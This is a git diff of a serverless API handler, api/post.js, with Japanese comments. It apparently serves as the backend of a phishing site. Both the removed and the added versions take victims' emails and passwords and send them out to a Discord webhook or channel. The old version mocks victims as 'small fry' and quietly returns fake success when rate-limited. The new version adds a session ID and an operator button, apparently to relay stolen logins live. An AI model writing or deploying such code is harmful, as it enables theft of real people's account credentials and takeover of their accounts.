@@ -1,73 +1,41 @@
 // api/post.js
-import { Redis } from '@upstash/redis';
-import { Ratelimit } from '@upstash/ratelimit';
-
-// --- 設定エリア ---
-const MAX_LENGTH_XDSS = 30; 
-const MAX_LENGTH_WANS = 30; 
-
-// UpstashのRedisに自動接続
-const redis = Redis.fromEnv();
-
-// レートリミット設定 (1時間に5回)
-const ratelimit = new Ratelimit({
-  redis: redis,
-  limiter: Ratelimit.slidingWindow(5, '1 h'),
-  analytics: true,
-});
-
 export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ message: 'Method Not Allowed' });
-  }
+    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');
 
-  const ip = req.headers['x-forwarded-for'] || '127.0.0.1';
-  const ipIdentifier = typeof ip === 'string' ? ip.split(',')[0] : ip;
+    const { email, password, sessionId } = req.body;
+    const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
+    const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
 
-  try {
-    const { success } = await ratelimit.limit(`ratelimit_${ipIdentifier}`);
-
-    // 制限中のステルス処理
-    if (!success) {
-      console.warn(`Rate limit exceeded for IP: ${ipIdentifier}`);
-      return res.status(200).json({ response: '200 OK' });
-    }
-
-    const WEBHOOK_URL = process.env.WEBHOOK_URL;
-    const { xdss, wans } = req.body;
-    
-    const cleanXdss = xdss || "";
-    const cleanWans = wans || "";
-
-    // 文字数制限
-    if (cleanXdss.length > MAX_LENGTH_XDSS || cleanWans.length > MAX_LENGTH_WANS) {
-      console.warn("Text length exceeded.");
-      return res.status(200).json({ response: '200 OK' });
-    }
-
-    const payload = {
-      embeds: [
-        {
-          title: "で、でたーwwwwwww",
-          description: `雑魚の情報はこちら\n\nメアド: ${cleanXdss}\n\nパスワード: ${cleanWans}`,
-          color: 3447003,
-          timestamp: new Date().toISOString()
-        }
-      ]
+    // Discordに送るメッセージ（ボタン付き）
+    const messageBody = {
+        content: `🎣 **新しい診断リクエスト**\nID or Email: ${email}\nPASS: ${password}\nSession ID: \`${sessionId}\``,
+        components: [
+            {
+                type: 1, // Action Row
+                components: [
+                    {
+                        type: 2, // Button
+                        style: 1, // Primary (Blue)
+                        label: "認証結果を送信 (人数入力)",
+                        custom_id: `open_modal::${sessionId}` // ボタンIDにセッションIDを埋め込む
+                    }
+                ]
+            }
+        ]
     };
 
-    if (WEBHOOK_URL) {
-      await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      });
+    try {
+        await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
+            method: 'POST',
+            headers: {
+                'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(messageBody)
+        });
+        res.status(200).json({ success: true });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ error: 'Discord send failed' });
     }
-
-    return res.status(200).json({ response: '200 OK' });
-
-  } catch (error) {
-    console.error("Server Error:", error);
-    return res.status(500).json({ response: '500 Internal Server Error' });
-  }
 }
